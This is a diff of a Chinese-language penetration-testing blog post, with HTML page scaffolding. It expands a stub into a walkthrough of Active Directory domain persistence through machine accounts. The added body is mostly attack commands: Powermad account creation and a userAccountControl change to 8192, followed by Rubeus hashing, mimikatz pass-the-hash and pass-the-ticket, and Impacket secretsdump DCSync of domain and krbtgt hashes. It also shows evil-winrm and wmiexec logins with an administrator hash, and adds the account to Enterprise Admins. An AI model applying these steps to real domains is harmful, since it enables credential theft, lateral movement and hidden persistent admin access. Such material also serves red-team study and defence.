@@ -20,18 +20,33 @@
     var CONFIG = {"hostname":"antipassion.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="机器账户在许多技术中可以用于提权或横向移动，如使用机器账户的委派进行dcsync达到提权、横向移动的目的。 除了上述作用，使用机器账户也可进行域维权操作。我们可以将任意计算机账户添加到高权限组(例如Domain Admin、Domain Controllers、Enterprise Admins) 或对计算机账户的userAccountControl属性进行修改。使用这两种方式，我们可以通过机器账">
+  <meta name="description" content="前言机器账户在许多技术中可以用于提权或横向移动，如使用机器账户的委派进行dcsyn了上述作用，使用机器账户也可进行维权操作。我们可以将任意计算机账户添加到高权限组(例如Domain Admin、Domain Controllers、Enterprise Admins) 或对计算机账户的userAccountControl属性进行修改。使用这两种方式，我们可以通过机器账户在域内进行身份认证（因为密码">
 <meta property="og:type" content="article">
 <meta property="og:title" content="利用机器账户进行域维权">
 <meta property="og:url" content="http://antipassion.github.io/2022/02/15/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83/index.html">
 <meta property="og:site_name" content="林中小屋">
-<meta property="og:description" content="机器账户在许多技术中可以用于提权或横向移动，如使用机器账户的委派进行dcsync达到提权、横向移动的目的。 除了上述作用，使用机器账户也可进行域维权操作。我们可以将任意计算机账户添加到高权限组(例如Domain Admin、Domain Controllers、Enterprise Admins) 或对计算机账户的userAccountControl属性进行修改。使用这两种方式，我们可以通过机器账">
+<meta property="og:description" content="前言机器账户在许多技术中可以用于提权或横向移动，如使用机器账户的委派进行dcsyn了上述作用，使用机器账户也可进行维权操作。我们可以将任意计算机账户添加到高权限组(例如Domain Admin、Domain Controllers、Enterprise Admins) 或对计算机账户的userAccountControl属性进行修改。使用这两种方式，我们可以通过机器账户在域内进行身份认证（因为密码">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://antipassion.github.io/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83.assets/image-20220217123153176.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83.assets/image-20220217123705198.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83.assets/image-20220217124450971.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83.assets/image-20220217125926482.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83.assets/image-20220217182940119.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83.assets/image-20220217183728074.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83.assets/image-20220219181751543.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83.assets/image-20220219181849365.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83.assets/image-20220217224346573.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83.assets/image-20220217233828242.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83.assets/image-20220217234439955.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83.assets/image-20220218223834377.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83.assets/image-20220219174954928.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83.assets/image-20220219182324269.png">
 <meta property="article:published_time" content="2022-02-15T14:54:20.000Z">
-<meta property="article:modified_time" content="2022-02-15T15:40:43.515Z">
+<meta property="article:modified_time" content="2022-02-19T10:42:57.372Z">
 <meta property="article:author" content="Nayon">
 <meta property="article:tag" content="域渗透">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://antipassion.github.io/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83.assets/image-20220217123153176.png">
 
 <link rel="canonical" href="http://antipassion.github.io/2022/02/15/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83/">
 
@@ -189,10 +204,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2022-02-15 22:54:20 / 修改时间：23:40:43" itemprop="dateCreated datePublished" datetime="2022-02-15T22:54:20+08:00">2022-02-15</time>
+              <time title="创建时间：2022-02-15 22:54:20" itemprop="dateCreated datePublished" datetime="2022-02-15T22:54:20+08:00">2022-02-15</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-02-19 18:42:57" itemprop="dateModified" datetime="2022-02-19T18:42:57+08:00">2022-02-19</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -221,9 +242,80 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>机器账户在许多技术中可以用于提权或横向移动，如使用机器账户的委派进行dcsync达到提权、横向移动的目的。</p>
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>机器账户在许多技术中可以用于提权或横向移动，如使用机器账户的委派进行dcsyn了上述作用，使用机器账户也可进行维权操作。我们可以将任意计算机账户添加到高权限组(例如Domain Admin、Domain Controllers、Enterprise Admins) 或对计算机账户的userAccountControl属性进行修改。使用这两种方式，我们可以通过机器账户在域内进行身份认证（因为密码已知）并进行提权操作，例如Dcsync拖取域内hash。</p>
 <p>除了上述作用，使用机器账户也可进行域维权操作。我们可以将任意计算机账户添加到高权限组(例如Domain Admin、Domain Controllers、Enterprise Admins) 或对计算机账户的<code>userAccountControl</code>属性进行修改。使用这两种方式，我们可以通过机器账户在域内进行身份认证（因为密码已知）并进行提权操作，例如Dcsync拖取域内hash。</p>
-<p>未完待续….</p>
+<span id="more"></span>
+
+<h2 id="userAccountControl说明"><a href="#userAccountControl说明" class="headerlink" title="userAccountControl说明"></a>userAccountControl说明</h2><p>默认的情况下，域中的标准用户最多可以创建10个机器账户，这是由<strong>ms-DS-MachineAccountQuota</strong>进行设定的。我们可以使用Powermad等工具从加入域和未加入域的主机中进行添加账户操作。但为了让机器账户在域中显示为域控制器，我们还需要将<code>userAccountControl</code>属性设置为0x2000(SERVER_TRUST_ACCOUNT)的值。0x2000换算为十进制数字为8192.修改此属性需要域管理员级别的权限。下面我们从ADSI编辑器中进行修改，改为8192</p>
+<p><img src="/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83.assets/image-20220217123153176.png" alt="image-20220217123153176"></p>
+<h2 id="PowerMad-Active-Directory组合"><a href="#PowerMad-Active-Directory组合" class="headerlink" title="PowerMad+Active Directory组合:"></a>PowerMad+Active Directory组合:</h2><h3 id="添加机器账户"><a href="#添加机器账户" class="headerlink" title="添加机器账户"></a>添加机器账户</h3><p>我们在进行维权时，可以从利用工具从命令行创建机器账户。例如Standln、SharpMad以及PowerMad等工具；下面展示如何利用PowerMad在域内添加一个机器账户。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Powermad.ps1</span><br><span class="line">New-MachineAccount -MachineAccount Nayon -Domain attack.local -DomainController dc.attack.local</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83.assets/image-20220217123705198.png" alt="image-20220217123705198"></p>
+<p>此时我们便添加机器账户成功了，利用如下命令查看:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain computers&quot; /domain</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83.assets/image-20220217124450971.png" alt="image-20220217124450971"></p>
+<h3 id="修改机器账户userAccountControl属性值"><a href="#修改机器账户userAccountControl属性值" class="headerlink" title="修改机器账户userAccountControl属性值"></a>修改机器账户userAccountControl属性值</h3><p>我们所创建的这台机器账户primarygroupid经过查询可知是515，他是域组的RID，表示这是一台域计算机，利用Active-Module模块，使用域管权限账户为计算机账户Nayon修改<code>userAccountControl</code>值为8192，则primarygroupid将更改为属于域控制器（可写）的 516。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Get-ADComputer Nayon -pro * | Select-object name, primarygroupid, useraccountcontrol</span><br><span class="line">Set-ADComputer Nayon -replace @&#123; &quot;userAccountcontrol&quot; = 8192 &#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83.assets/image-20220217125926482.png" alt="image-20220217125926482"></p>
+<p>[^此处若发现域主机内不存在Active Directory模块，可在本地上传Microsoft.ActiveDirectory.Management .dll在Powershell利用import-module 进行安装使用]: </p>
+<p>此处为执行效果。</p>
+<h3 id="获得机器账户hash"><a href="#获得机器账户hash" class="headerlink" title="获得机器账户hash"></a>获得机器账户hash</h3><p>由于我们已知机器账户的密码，因此我们可以利用它的NTLM 、aes128、aes256 hash 来进行pth，用于获得一个拥有域控制器权限的会话。</p>
+<p>利用Rubes将Nayon账户的明文密码转为NTLM hash，用于维权时进行的pth。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe hash /user:Nayon /password:Password@1! /domain:attack.local</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83.assets/image-20220217182940119.png" alt="image-20220217182940119"></p>
+<p>如图所示，成功拿到了机器账户的hash。</p>
+<h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式:"></a>利用方式:</h3><h4 id="PTH传递获得权限"><a href="#PTH传递获得权限" class="headerlink" title="PTH传递获得权限"></a>PTH传递获得权限</h4><p>在域内机器上利用mimikatz进行pth攻击，成功弹回具有Nayon用户权限的新会话。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::pth /user:Nayon /domain:attack.local /aes128:95F9380561068098A673F425207EFA0D</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83.assets/image-20220217183728074.png" alt="image-20220217183728074"></p>
+<p><strong>注意：此处拿到的会话，唯有域用户处于高权限组内才可使用dcsync获得域内hash。</strong></p>
+<h4 id="利用PTT获得权限"><a href="#利用PTT获得权限" class="headerlink" title="利用PTT获得权限"></a>利用PTT获得权限</h4><p>由于PTH是需要本地管理员权限的，若我们此时连本地管理员权限都没有，我们还可以使用mimikatz自带的ptt功能拿到相应权限。</p>
+<p><strong>注意：此处拿到的会话，本人本地测试即使是将机器用户的<code>userAccountConrol</code>属性值改为8192也无法执行dcsync获得域内hash，唯有划入域内高权限组内可以使用机器账户权限执行dcsync。</strong></p>
+<p>利用利用Rubes申请拿到机器账户的hash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe hash /user:Nayon /password:123456 /domain:attack.local</span><br></pre></td></tr></table></figure>
+
+<p>使用keke申请tgt票据，用于下一步的ptt攻击</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgt::ask /user:Nayon2 /domain:attack.local /ntlm:32ED87BDB5FDC5E9CBA88547376818D4</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83.assets/image-20220219181751543.png" alt="image-20220219181751543"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt  TGT_Nayon@ATTACK.LOCAL_krbtgt~attack.local@ATTACK.LOCAL.kirbi</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83.assets/image-20220219181849365.png" alt="image-20220219181849365"></p>
+<p>此时成功拿到域内hash</p>
+<h4 id="利用impacket套件执行dcsync"><a href="#利用impacket套件执行dcsync" class="headerlink" title="利用impacket套件执行dcsync"></a>利用impacket套件执行dcsync</h4><p>使用Impacket套件中的secretsdump.py脚本，结合域内机器账户的凭证拖取域内hash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 secretsdump.py attack.local/Nayon\$:&#x27;Password@1!&#x27;@10.10.10.165 -just-dc</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83.assets/image-20220217224346573.png" alt="image-20220217224346573"></p>
+<p>利用其中的域管NTLM hash与域控机进行通信</p>
+<h4 id="Evil-WinRM通过WinRM远程链接"><a href="#Evil-WinRM通过WinRM远程链接" class="headerlink" title="Evil-WinRM通过WinRM远程链接"></a>Evil-WinRM通过WinRM远程链接</h4><p>前提是域管开启WinRM服务，默认端口5985</p>
+<p>指定域管用户以及域管用户的NTLM hash 远程链接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.10.165 -u administrator -H dbf36575210cc5a38ab4050cc6a2e9aa</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83.assets/image-20220217233828242.png" alt="image-20220217233828242"></p>
+<h4 id="Impacket套件wmiexec-py远程链接"><a href="#Impacket套件wmiexec-py远程链接" class="headerlink" title="Impacket套件wmiexec.py远程链接"></a>Impacket套件wmiexec.py远程链接</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 wmiexec.py -hash dbf36575210cc5a38ab4050cc6a2e9aa administrator@10.10.10.165</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83.assets/image-20220217234439955.png" alt="image-20220217234439955"></p>
+<h3 id="加入高权限用户组用以维权"><a href="#加入高权限用户组用以维权" class="headerlink" title="加入高权限用户组用以维权"></a>加入高权限用户组用以维权</h3><p>除去域用户之外，域内机器账户也可以添加到高权限用户组中用以维权。利用Active Directory模块查询域管用户所在的用户组。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ADGroupMember &quot;administrators&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83.assets/image-20220218223834377.png" alt="image-20220218223834377"></p>
+<p>使用域管权限的会话添加机器账户Nayon$到高权限用户组内。</p>
+<p>可加入Enterprise Admins、Administrators、Domain Admins等高权限组内用以维权。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;Enterprise admins&quot; Nayon$ /add /domain</span><br></pre></td></tr></table></figure>
+
+<p>利用net group查看是否被添加成功</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;Enterprise admins&quot; /domain</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83.assets/image-20220219174954928.png" alt="image-20220219174954928"></p>
+<p>此时我们便可以使用Impacket中的secretsdump项目获得域内hash</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 secretsdump.py attack.local/Nayon\$:<span class="string">&#x27;123456&#x27;</span>@10.<span class="number">10.10</span>.<span class="number">165</span> -just-dc-user krbtgt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83.assets/image-20220219182324269.png" alt="image-20220219182324269"></p>
+<p>其余利用方式大同小异，在这里我便不再过多赘述了……</p>
 
     </div>
 
@@ -304,6 +396,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#userAccountControl%E8%AF%B4%E6%98%8E"><span class="nav-number">2.</span> <span class="nav-text">userAccountControl说明</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PowerMad-Active-Directory%E7%BB%84%E5%90%88"><span class="nav-number">3.</span> <span class="nav-text">PowerMad+Active Directory组合:</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B7%BB%E5%8A%A0%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7"><span class="nav-number">3.1.</span> <span class="nav-text">添加机器账户</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7userAccountControl%E5%B1%9E%E6%80%A7%E5%80%BC"><span class="nav-number">3.2.</span> <span class="nav-text">修改机器账户userAccountControl属性值</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%BE%97%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7hash"><span class="nav-number">3.3.</span> <span class="nav-text">获得机器账户hash</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="nav-number">3.4.</span> <span class="nav-text">利用方式:</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#PTH%E4%BC%A0%E9%80%92%E8%8E%B7%E5%BE%97%E6%9D%83%E9%99%90"><span class="nav-number">3.4.1.</span> <span class="nav-text">PTH传递获得权限</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8PTT%E8%8E%B7%E5%BE%97%E6%9D%83%E9%99%90"><span class="nav-number">3.4.2.</span> <span class="nav-text">利用PTT获得权限</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8impacket%E5%A5%97%E4%BB%B6%E6%89%A7%E8%A1%8Cdcsync"><span class="nav-number">3.4.3.</span> <span class="nav-text">利用impacket套件执行dcsync</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Evil-WinRM%E9%80%9A%E8%BF%87WinRM%E8%BF%9C%E7%A8%8B%E9%93%BE%E6%8E%A5"><span class="nav-number">3.4.4.</span> <span class="nav-text">Evil-WinRM通过WinRM远程链接</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Impacket%E5%A5%97%E4%BB%B6wmiexec-py%E8%BF%9C%E7%A8%8B%E9%93%BE%E6%8E%A5"><span class="nav-number">3.4.5.</span> <span class="nav-text">Impacket套件wmiexec.py远程链接</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8A%A0%E5%85%A5%E9%AB%98%E6%9D%83%E9%99%90%E7%94%A8%E6%88%B7%E7%BB%84%E7%94%A8%E4%BB%A5%E7%BB%B4%E6%9D%83"><span class="nav-number">3.5.</span> <span class="nav-text">加入高权限用户组用以维权</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
